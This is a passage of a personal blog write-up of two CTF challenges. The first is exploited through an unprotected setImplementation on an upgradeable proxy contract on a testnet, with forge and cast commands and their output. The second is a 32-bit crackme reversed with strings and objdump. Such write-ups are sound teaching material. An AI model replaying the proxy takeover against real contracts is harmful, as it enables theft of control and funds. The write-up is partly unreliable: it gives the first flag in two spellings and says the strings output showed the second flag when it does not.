+ubuntu@sandbox:~ $ cd /home/ubuntu/foundry_challenge &amp;&amp; forge init foundry_challenge
+
+Initializing /home/ubuntu/foundry_challenge...
+
+Installing forge-std in /home/ubuntu/foundry_challenge/lib/forge-std (url: Some(&#34;https://github.com/foundry-rs/forge-std&#34;), tag: None)
+
+Cloning into &#39;/home/ubuntu/foundry_challenge/lib/forge-std&#39;...
+
+remote: Enumerating objects: 2126, done.
+
+remote: Counting objects: 100% (1008/1008), done.
+
+remote: Compressing objects: 100% (131/131), done.
+
+remote: Total 2126 (delta 932), reused 879 (delta 877), pack-reused 1118 (from 2)
+
+Receiving objects: 100% (2126/2126), 720.75 KiB | 25.74 MiB/s, done.
+
+Resolving deltas: 100% (1431/1431), done.
+
+Installed forge-std v1.9.7
+
+Initialized forge project
+
+ubuntu@sandbox:~/foundry_challenge $
+</code></pre><h3 id=2-building-foundry-project>2. Building Foundry Project</h3><pre tabindex=0><code>
+ubuntu@sandbox:~ $ cd /home/ubuntu/foundry_challenge &amp;&amp; forge build
+
+[⠊] Compiling... Compiling...
+
+[⠒] Compiling 26 files with Solc 0.8.30
+
+[⠰] Installing Solc version 0.8.30lc version 0.8.30lc version 0.8.30
+
+[⠆] Successfully installed Solc 0.8.30alled Solc 0.8.30alled Solc 0.8.30alled Solc 0.8.30alled Solc 0.8.30alled Solc 0.8.30alled Solc 0.8.30alled Solc 0.8.30alled Solc 0.8.30
+
+[⠰] Solc 0.8.30 finished in 1.03s
+
+Compiler run successful!
+
+ubuntu@sandbox:~/foundry_challenge $
+</code></pre><h3 id=3-running-foundry-tests-initial-attempt---before-setimplementation>3. Running Foundry Tests (Initial Attempt - Before <code>setImplementation</code>)</h3><pre tabindex=0><code>
+ubuntu@sandbox:~ $ cd /home/ubuntu/foundry_challenge &amp;&amp; forge test --fork-url https://sepolia.base.org
+
+[⠊] Compiling... Compiling...
+
+No files changed, compilation skipped
+
+Ran 2 tests for test/Counter.t.sol:CounterTest
+
+[PASS] testFuzz_SetNumber(uint256) (runs: 256, μ: 32198, ~: 32354)
+
+[PASS] test_Increment() (gas: 31851)
+
+Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 153.43ms (12.21ms CPU time)
+
+Ran 1 test for src/ProxyMaster.t.sol:ProxyMasterTest
+
+[FAIL: Proxy should be unlocked] testExploit() (gas: 16975)
+
+Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 195.29ms (32.50ms CPU time)
+
+Ran 2 test suites in 262.32ms (348.72ms CPU time): 2 tests passed, 1 failed, 0 skipped (3 total tests)
+
+Failing tests:
+
+Encountered 1 failing test in src/ProxyMaster.t.sol:ProxyMasterTest
+
+[FAIL: Proxy should be unlocked] testExploit() (gas: 16975)
+
+Encountered a total of 1 failing tests, 2 tests succeeded
+
+ubuntu@sandbox:~/foundry_challenge $
+</code></pre><h3 id=4-running-foundry-tests-after-adding-setimplementation>4. Running Foundry Tests (After adding <code>setImplementation</code>)</h3><pre tabindex=0><code>
+ubuntu@sandbox:~ $ cd /home/ubuntu/foundry_challenge &amp;&amp; forge test --fork-url https://sepolia.base.org
+
+[⠊] Compiling... Compiling...
+
+[⠑] Compiling 1 files with Solc 0.8.30 with Solc 0.8.30 with Solc 0.8.30 with Solc 0.8.30 with Solc 0.8.30 with Solc 0.8.30 with Solc 0.8.30
+
+[⠘] Solc 0.8.30 finished in 658.16ms
+
+Compiler run successful!
+
+Ran 2 tests for test/Counter.t.sol:CounterTest
+
+[PASS] testFuzz_SetNumber(uint256) (runs: 256, μ: 32043, ~: 32354)
+
+[PASS] test_Increment() (gas: 31851)
+
+Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 186.78ms (13.28ms CPU time)
+
+Ran 1 test for src/ProxyMaster.t.sol:ProxyMasterTest
+
+[PASS] testExploit() (gas: 35748)
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 240.80ms (48.35ms CPU time)
+
+Ran 2 test suites in 296.42ms (427.58ms CPU time): 3 tests passed, 0 failed, 0 skipped (3 total tests)
+
+ubuntu@sandbox:~/foundry_challenge $
+</code></pre><h3 id=5-deploying-exploitimplementation-contract>5. Deploying <code>ExploitImplementation</code> Contract</h3><pre tabindex=0><code>
+ubuntu@havoc:~ $ cd /home/ubuntu/foundry_challenge &amp;&amp; forge create src/ExploitImplementation.sol:ExploitImplementation --rpc-url https://sepolia.base.org --private-key &lt;YOUR_PRIVATE_KEY&gt; --broadcast
+
+[⠊] Compiling... Compiling...
+
+No files changed, compilation skipped
+
+Deployer: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
+
+Deployed to: 0x48443c12F9E3f39F70877ada091C0199a91c9a63
+
+Transaction hash: 0xe6b71ebd387b823e92aab9cb9c075525d3623947a76617e6d5044625bbb49b7c
+
+ubuntu@havoc:~/foundry_challenge $
+</code></pre><p><em>(Note: Replace <code>&lt;YOUR_PRIVATE_KEY></code> with your actual private key. The deployed address <code>0x48443c12F9E3f39F70877ada091C0199a91c9a63</code> will be used in subsequent steps.)</em></p><h3 id=6-setting-new-implementation-address-for-proxymaster>6. Setting New Implementation Address for <code>ProxyMaster</code></h3><pre tabindex=0><code>
+ubuntu@havoc:~ $ cd /home/ubuntu &amp;&amp; cast send --private-key &lt;YOUR_PRIVATE_KEY&gt; 0x85aD671D00348eA2924e7472A678dD085b4B1Dd4 &#34;setImplementation(address)&#34; 0x48443c12F9E3f39F70877ada091C0199a91c9a63 --rpc-url https://sepolia.base.org
+
+blockHash 0x9ecd777db497b8398ae437cdd210f16e69302e75c7535f0421f49574aeae4049
+
+blockNumber 27057008
+
+contractAddress
+
+cumulativeGasUsed 3395001
+
+effectiveGasPrice 123093
+
+from 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
+
+gasUsed 26969
+
+logs []
+
+logsBloom 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+
+root
+
+status 1 (success)
+
+transactionHash 0x408f4b17f5ba8de0f4a47b45280c010555aeab7788707b07a1386d82719dee4f
+
+transactionIndex 15
+
+type 2
+
+blobGasPrice
+
+blobGasUsed
+
+to 0x85aD671D00348eA2924e7472A678dD085b4B1Dd4
+
+l1BaseFeeScalar 1101
+
+l1BlobBaseFee 1
+
+l1BlobBaseFeeScalar 659851
+
+l1Fee 1449772
+
+l1GasPrice 822949
+
+l1GasUsed 1600
+
+ubuntu@sandbox:~ $
+</code></pre><p><em>(Note: Replace <code>&lt;YOUR_PRIVATE_KEY></code> with your actual private key.)</em></p><h3 id=7-executing-setunlockedtrue-via-proxymaster>7. Executing <code>setUnlocked(true)</code> via <code>ProxyMaster</code></h3><pre tabindex=0><code>
+ubuntu@havoc:~ $ cd /home/ubuntu &amp;&amp; cast send --private-key &lt;YOUR_PRIVATE_KEY&gt; 0x85aD671D00348eA2924e7472A678dD085b4B1Dd4 &#34;execute(bytes)&#34; &#34;$(cast calldata &#39;setUnlocked(bool)&#39; true)&#34; --rpc-url https://sepolia.base.org
+
+blockHash 0xc29b2f5ff35930a91aa9f02c745a17376a0b9fe3832e7735d7f24b04b11ef510
+
+blockNumber 27057016
+
+contractAddress
+
+cumulativeGasUsed 1626055
+
+effectiveGasPrice 123158
+
+from 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
+
+gasUsed 31195
+
+logs []
+
+logsBloom 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+
+root
+
+status 1 (success)
+
+transactionHash 0x0f1fb6233fe882726d0c5e6c83e5b84dfc33ed6594c6155c522abc93ff1febb9
+
+transactionIndex 8
+
+type 2
+
+blobGasPrice
+
+blobGasUsed
+
+to 0x85aD671D00348eA2924e7472A678dD085b4B1Dd4
+
+l1BaseFeeScalar 1101
+
+l1BlobBaseFee 1
+
+l1BlobBaseFeeScalar 659851
+
+l1Fee 1477157
+
+l1GasPrice 838494
+
+l1GasUsed 1600
+
+ubuntu@sandbox:~ $
+</code></pre><p><em>(Note: Replace <code>&lt;YOUR_PRIVATE_KEY></code> with your actual private key.)</em></p><h3 id=8-verifying-isunlocked-state>8. Verifying <code>isUnlocked()</code> State</h3><pre tabindex=0><code>
+ubuntu@havoc:~ $ cd /home/ubuntu &amp;&amp; cast call 0x85aD671D00348eA2924e7472A678dD085b4B1Dd4 &#34;isUnlocked()(bool)&#34; --rpc-url https://sepolia.base.org
+
+true
+
+ubuntu@havoc:~ $
+</code></pre><h3 id=9-retrieving-the-flag>9. Retrieving the Flag</h3><pre tabindex=0><code>
+ubuntu@havoc:~ $ cd /home/ubuntu &amp;&amp; cast call 0x85aD671D00348eA2924e7472A678dD085b4B1Dd4 &#34;getFlag()(string)&#34; --rpc-url https://sepolia.base.org
+
+&#34;SCOK{d3l3g4t3c4ll_pr0xy_1337}&#34;
+
+ubuntu@havoc:~ $
+</code></pre><h2 id=flag>Flag</h2><p>The flag obtained is: <code>SCOK{d3l3l3g4t3c4ll_pr0xy_1337}</code></p><h2 id=conclusion>Conclusion</h2><p>This challenge demonstrates a common vulnerability in upgradeable proxy contracts where insufficient access control on the <code>setImplementation</code> function, combined with the nature of <code>delegatecall</code> and storage slot collisions, can lead to unauthorized state modifications. By carefully crafting a malicious implementation contract that aligns its storage layout with the proxy&rsquo;s critical state variables, an attacker can take control of the proxy&rsquo;s state. This highlights the importance of robust access control and careful consideration of storage layout when designing upgradeable proxy patterns.</p><p>The next challenge that was cool.</p><h1 id=crack-me>Crack Me</h1><p><img src="https://github.com/Daniel-wambua/blogz/blob/main/content/CTF/writeup9/images/crack%20me.png?raw=true" alt=file></p><h2 id=challenge-description-1>Challenge Description</h2><p>The challenge provided a <a href=https://github.com/Daniel-wambua/blogz/raw/bf313865e56c8f0e5031f07fcbaa18906a4bedc1/content/CTF/writeup9/images/crackme.zip><strong>&lsquo;crackme.zip&rsquo;</strong></a> file and a hint: &ldquo;You might need a little more than reversing&mldr;&rdquo;.</p><h2 id=solution-steps>Solution Steps</h2><h3 id=phase-1-extraction-and-initial-analysis>Phase 1: Extraction and Initial Analysis</h3><ol><li><p><strong>Unzip the challenge file:</strong>
+The provided <code>crackme.zip</code> was password-protected.So i Cracked it simple and clear</p><p><img src="https://github.com/Daniel-wambua/blogz/blob/main/content/CTF/writeup9/images/passwordcraking.png?raw=true" alt=crack></p><p>Using the given password &ldquo;reverseit&rdquo;, the file was successfully extracted.</p></li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Archive:  /home/ubuntu/upload/crackme.zip
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>/home/ubuntu/upload/crackme.zip<span style=color:#f92672>]</span> crackme password: reverseit
+</span></span><span style=display:flex><span>  inflating: /home/ubuntu/crackme/crackme
+</span></span><span style=display:flex><span>  
+</span></span></code></pre></div><ol start=2><li><strong>Identify file type:</strong>
+Initially, the <code>file</code> command was not available in the linux i was using . Ii installed, and then used it to determine the type of the extracted file</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo apt-get update <span style=color:#f92672>&amp;&amp;</span> sudo apt-get install -y file
+</span></span><span style=display:flex><span>file crackme
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>/home/ubuntu/crackme/crackme: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=7ee4206d91718e7b0bef16a7c03f8fa49c4a39e7, not stripped
+</span></span></code></pre></div><pre><code>This confirmed it was a 32-bit ELF executable.
+</code></pre><ol start=3><li><strong>Make executable and run:</strong>
+The binary needed execute permissions, which were granted using <code>chmod</code>. Attempting to run it initially failed due to missing 32-bit libraries.</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>chmod +x crackme
+</span></span><span style=display:flex><span>./crackme
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>bash: ./crackme: Permission denied
+</span></span></code></pre></div><ol start=4><li><p><strong>Install 32-bit libraries:</strong>
+To run the 32-bit executable on a 64-bit system, the <code>libc6-i386</code> package was installed.</p></li><li><p><strong>Run the binary and explore:</strong>
+After installing the libraries, the binary could be executed. It presented a simple menu:</p></li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>Menu:
+</span></span><span style=display:flex><span>[1] Say hello
+</span></span><span style=display:flex><span>[2] Add numbers
+</span></span><span style=display:flex><span>[3] Quit
+</span></span><span style=display:flex><span>[&gt;] 
+</span></span></code></pre></div><p>Interacting with options 1 and 2 showed basic functionality, but no immediate flag.</p><p><img src="https://github.com/Daniel-wambua/blogz/blob/main/content/CTF/writeup9/images/filesection.png?raw=true" alt=menu></p><h3 id=phase-2-reverse-engineering>Phase 2: Reverse Engineering</h3><ol><li><p><strong>Extract strings:</strong>
+The <code>strings</code> command was used to extract human-readable strings from the binary, looking for anything suspicious or indicative of a flag.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash></code></pre></div></li></ol><p>sudo apt-get update && sudo apt-get install -y binutils
+strings crackme</p><pre tabindex=0><code>
+
+```text
+tdh	
+/lib/ld-linux.so.2
+libc.so.6
+_IO_stdin_used
+__isoc99_scanf
+puts
+printf
+memset
+__libc_start_main
+/usr/local/lib:$ORIGIN
+__gmon_start__
+GLIBC_2.7
+GLIBC_2.0
+PTRh
+QRPh
+j&#34;jA
+[^_]
+UWVS
+t$,U
+[^_]
+Menu:
+[1] Say hello
+[2] Add numbers
+[3] Quit
+[&gt;] 
+Unknown input!
+What is your name? 
+%99s
+Unable to read name!
+Hello, %s!
+Enter first number: 
+%d + %d = %d
+Goodbye!
+Wow such h4x0r!
+Unknown choice: %d
+;*2$&#34;4
+GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.9) 5.4.0 20160609
+crtstuff.c
+__JCR_LIST__
+deregister_tm_clones
+__do_global_dtors_aux
+completed.7209
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+loop1.c
+giveFlag
+__FRAME_END__
+__JCR_END__
+__init_array_array_end
+_DYNAMIC
+__init_array_start
+__GNU_EH_FRAME_HDR
+_GLOBAL_OFFSET_TABLE_
+__libc_csu_fini
+_ITM_deregisterTMCloneTable
+__x86.get_pc_thunk.bx
+printf@@GLIBC_2.0
+_edata
+__data_start
+puts@@GLIBC_2.0
+__gmon_start__
+__dso_handle
+_IO_stdin_used
+__libc_start_main@@GLIBC_2.0
+__libc_csu_init
+memset@@GLIBC_2.0
+_fp_hw
+__bss_start
+main
+_Jv_RegisterClasses
+__isoc99_scanf@@GLIBC_2.7
+__TMC_END__
+_ITM_registerTMCloneTable
+.symtab
+.strtab
+.shstrtab
+.interp
+.note.ABI-tag
+.note.gnu.build-id
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rel.dyn
+.rel.plt
+.init
+.plt.got
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.jcr
+.dynamic
+.got.plt
+.data
+.bss
+.comment
+</code></pre><pre><code>Among the output, the string `Wow such h4x0r!` and `flag{much_reversing_very_ida_wow}` were found, suggesting that there's a hidden path to trigger the flag.
+</code></pre><ol start=2><li><p><strong>Disassemble the binary:</strong>
+To understand the program&rsquo;s logic, <code>objdump</code> was used to disassemble the binary into assembly code.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash></code></pre></div></li></ol><p>objdump -d crackme > crackme.asm</p><pre tabindex=0><code>
+```text
+ ubuntu@havoc:~/crackme $ cd /home/ubuntu/crackme/ &amp;&amp; objdump -d  crackme &gt; crackme.asm
+
+ubuntu@havoc:~/crackme $
+</code></pre><ol start=3><li><p><strong>Analyze assembly code:</strong>
+Reviewing <code>crackme.asm</code>, specifically the <code>main</code> function, revealed a comparison instruction <code>cmp $0x7a69,%eax</code> followed by a conditional jump (<code>jne</code>). This indicated that if the value in <code>%eax</code> was <code>0x7a69</code> (decimal <code>31337</code>), a specific code path would be taken. This path led to a call to the <code>giveFlag</code> function, which was likely responsible for printing the flag.</p><p>The relevant section in <code>main</code> looked something like this:</p><pre tabindex=0><code class=language-assembly data-lang=assembly>... (code for menu input)
+8048665:	3d 69 7a 00 00       	cmp    $0x7a69,%eax
+804866a:	75 17                	jne    8048683 &lt;main+0x1c8&gt;
+804866c:	83 ec 0c             	sub    $0xc,%esp
+804866f:	68 bc 88 04 08       	push   $0x80488bc  ; This address likely points to &#34;Wow such h4x0r!\n&#34;
+8048674:	e8 f7 fc ff ff       	call   8048370 &lt;puts@plt&gt;
+8048679:	e8 25 00 00 00       	call   80486a6 &lt;giveFlag&gt;
+... (rest of the code)
+</code></pre></li></ol><h3 id=phase-3-triggering-the-flag>Phase 3: Triggering the Flag</h3><p>Based on the reverse engineering, the key was to input the decimal value <code>31337</code> when prompted for a menu choice.</p><ol><li><p><strong>Run the binary and input the magic number:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>./crackme
+</span></span><span style=display:flex><span>Menu:
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>1<span style=color:#f92672>]</span> Say hello
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>2<span style=color:#f92672>]</span> Add numbers
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>3<span style=color:#f92672>]</span> Quit
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>&gt;<span style=color:#f92672>]</span> <span style=color:#ae81ff>31337</span>
+</span></span></code></pre></div></li><li><p><strong>Obtain the flag:</strong>
+Upon entering <code>31337</code>, the program printed the success message and the flag:</p><pre tabindex=0><code>Wow such h4x0r!
+flag{much_reversing_very_ida_wow}
+</code></pre></li></ol><h2 id=flag-1>Flag</h2><p><code>flag{much_reversing_very_ida_wow}</code></p><blockquote><p>That was a cool ctf and i got various chall&rsquo; that were very cool and juicy!! but the above were the one were interesting to me and i ahd the urge to share.⚡</p></blockquote></span></article></div></main></div><footer><div class="flex flex-col justify-center p-10"><p class="text-center text-slate-700 dark:text-slate-400">&copy;
+2025
+Richie-Havoc</p><p class="text-center text-sm text-slate-700 dark:text-slate-400">Powered by <a class="hover:underline hover:decoration-indigo-500 hover:text-indigo-500" href=https://gohugo.io target=_blank rel="noopener noreferrer">Hugo</a> & <a class="hover:underline hover:decoration-indigo-500 hover:text-indigo-500" href=https://github.com/chrede88/qubt target=_blank rel="noopener noreferrer">Qubt</a></p></div></footer></body></html>
